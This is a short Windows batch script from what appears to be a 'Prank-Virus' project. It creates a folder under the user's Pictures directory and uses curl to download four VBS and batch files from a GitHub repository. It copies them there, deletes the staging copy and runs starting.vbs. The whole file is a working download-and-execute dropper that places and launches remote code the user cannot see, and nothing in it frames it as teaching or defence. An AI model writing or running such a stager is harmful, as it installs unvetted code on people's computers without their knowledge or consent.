MKDIR %USERPROFILE%\Pictures\Props
MKDIR Props
curl https://raw.githubusercontent.com/PottersGame/Prank-Virus/main/Hiden_Zubor/Props/IconChanger.vbs -o Props\IconChanger.vbs
curl https://raw.githubusercontent.com/PottersGame/Prank-Virus/main/Hiden_Zubor/Props/Prieskumnik.vbs -o Props\Prieskumnik.vbs
curl https://raw.githubusercontent.com/PottersGame/Prank-Virus/main/Hiden_Zubor/Props/Programbatbat.bat -o Props\Programbatbat.bat
curl https://raw.githubusercontent.com/PottersGame/Prank-Virus/main/Hiden_Zubor/Props/starting.vbs -o Props\starting.vbs
xcopy /e /v Props %USERPROFILE%\Pictures\Props
del /Q Props
C:
CD %USERPROFILE%\Pictures\Props
starting.vbs -o
